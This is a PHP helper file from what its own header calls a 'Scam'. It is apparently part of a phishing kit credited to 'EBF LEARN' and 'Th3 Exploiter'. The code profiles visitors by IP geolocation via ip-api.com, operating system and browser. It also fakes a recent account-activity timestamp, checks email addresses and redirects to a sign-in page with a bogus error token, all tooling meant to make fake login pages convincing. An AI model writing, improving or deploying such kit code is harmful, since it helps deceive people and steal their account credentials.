<?php

/*
 * This Scam is Cleaned And updates by EBF LEARN 
 * Contact Me : SOAK DERMIN
 * This party is added by EBF LEARN
 * Please don't forget to support us for more tools
 */

$language   = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
$user_agent =   $_SERVER['HTTP_USER_AGENT'];
date_default_timezone_set('GMT');
function Get_Activity_Date() //Coded By Th3 Exploiter
{
    $day_s = date("d");
    $month_s = date("m");
    $year_s = date("Y");
    $hour_s = rand(0,23);
    $minute_s = rand(0,59);
    $ss = ($day_s-1);
    if ($ss == 0) 
    {
        $ss = "31";
    }
    $strdate = ($ss."/".$month_s."/".$year_s.", ".$hour_s.":".$minute_s);
    return $strdate;
}
function Get_Lang()
{
    switch ($language)
    {
        case "fr": $lang = "fr";
            break;  
        case "it":
            $lang= "it";
            break;
        case "en":
            $lang= "en";
            break;  
        case "de":
            $lang= "de";
            break;
        case "br":
            $lang= "br";
            break;  
        case "es":
            $lang = "es";
            break;
        case "nl":$lang = "nl";
            break;
            case "se": $lang = "se";
            break;
        case "ch": $lang = "ch";
            break;
        case "il": $lang = "il";
            break;
        case "jp": $lang = "jp";
            break;
        case "tr": $lang = "tr";
            break;
                case "no": $lang = "no";
            break;  
            case "da": $lang = "da";
            break;  
        default:
            $lang= "en";
            break;
    }
    return $lang;
}
function Get_IP()
{
    foreach (array('HTTP_CLIENT_IP','HTTP_X_FORWARDED_FOR','HTTP_X_FORWARDED','HTTP_X_CLUSTER_CLIENT_IP','HTTP_FORWARDED_FOR','HTTP_FORWARDED','REMOTE_ADDR') as $key)
   {
       if (array_key_exists($key, $_SERVER) === true)
       {
            foreach (explode(',', $_SERVER[$key]) as $IPaddress){
                $IPaddress = trim($IPaddress);
                if (filter_var($IPaddress,FILTER_VALIDATE_IP,FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)!== false) 
                {
                   return $IPaddress;
                }
            }
        }
    }
}

function getOS() { 
    global $user_agent;
    $os_platform    =   "Unknown OS Platform";
    $os_array       =   array(
                            '/windows nt 10/i'     =>  'Windows 10',
                            '/windows nt 6.3/i'     =>  'Windows 8.1',
                            '/windows nt 6.2/i'     =>  'Windows 8',
                            '/windows nt 6.1/i'     =>  'Windows 7',
                            '/windows nt 6.0/i'     =>  'Windows Vista',
                            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                            '/windows nt 5.1/i'     =>  'Windows XP',
                            '/windows xp/i'         =>  'Windows XP',
                            '/windows nt 5.0/i'     =>  'Windows 2000',
                            '/windows me/i'         =>  'Windows ME',
                            '/win98/i'              =>  'Windows 98',
                            '/win95/i'              =>  'Windows 95',
                            '/win16/i'              =>  'Windows 3.11',
                            '/macintosh|mac os x/i' =>  'Mac OS X',
                            '/mac_powerpc/i'        =>  'Mac OS 9',
                            '/linux/i'              =>  'Linux',
                            '/ubuntu/i'             =>  'Ubuntu',
                            '/iphone/i'             =>  'iPhone',
                            '/ipod/i'               =>  'iPod',
                            '/ipad/i'               =>  'iPad',
                            '/android/i'            =>  'Android',
                            '/blackberry/i'         =>  'BlackBerry',
                            '/webos/i'              =>  'Mobile');
    foreach ($os_array as $regex => $value) { 
        if (preg_match($regex, $user_agent)) {
            $os_platform    =   $value;
        }
    }   
    return $os_platform;
}
function getBrowser() {
    global $user_agent;
    $browser        =   "Unknown Browser";
    $browser_array  =   array(
                            '/msie/i'       =>  'Internet Explorer',
                            '/firefox/i'    =>  'Firefox',
                            '/safari/i'     =>  'Safari',
                            '/chrome/i'     =>  'Chrome',
                            '/edge/i'       =>  'Edge',
                            '/opera/i'      =>  'Opera',
                            '/netscape/i'   =>  'Netscape',
                            '/maxthon/i'    =>  'Maxthon',
                            '/konqueror/i'  =>  'Konqueror',
                            '/mobile/i'     =>  'Handheld Browser');
    foreach ($browser_array as $regex => $value) { 
        if (preg_match($regex, $user_agent)) {
            $browser    =   $value;
        }
    }
    return $browser;
}
function IP_Data($ipa,$ss) //Coded By Th3 Exploiter
{
   $json = file_get_contents("http://ip-api.com/json/".$ipa);
   $code = json_decode($json);
   $str = "";
    switch ($ss) {
        case "code":
            $str = $code->countryCode;
            break;
        case "country":
            $str = $code->country;
            break;
        case "city":
            $str = $code->city;
            break;
        case "state":
            $str = $code->regionName;
            break;
        case "zip":
            $str = $code->zip;
            break;
        case "ip":
            $str = $code->query;
            break;
        default:
            $str = $code->timezone;
    }
   return $str;
}
function validate_email($email){
  $flag = false;
  $hhh = (filter_var($email, FILTER_VALIDATE_EMAIL) ? '' : 'not')."valid";
  if ($hhh == "notvalid") {
    $flag = false;
  }
  else
  {
    $flag = true;
  }
  return $flag;
}
function Error()
{   
    $ER = sha1(md5(gmdate('wa zabbi')));
    $ERR = "UnknownError";
    $erreur = header("Location: signin.php?resType=code&failedBecause=".$ERR."&TokenError=".$ER."");
    return $erreur;
}
function Coding2Str($length= 20) {
    $code = '0123456789AaBbCcDdEeFfGhHiIjJkKlLmMnNoOpPqQrRsStTuUvVwWxXyYzZ';
    $stringo= '';
    for ($i = 0; $i < $length; $i++) {
        $stringo.= $code[rand(0, strlen($code) - 1)];
    }
    return $stringo;
}
$user_os        =   getOS();
$user_browser   =   getBrowser();
$logindate  = date("d/m/Y h:i:sa");
 ?>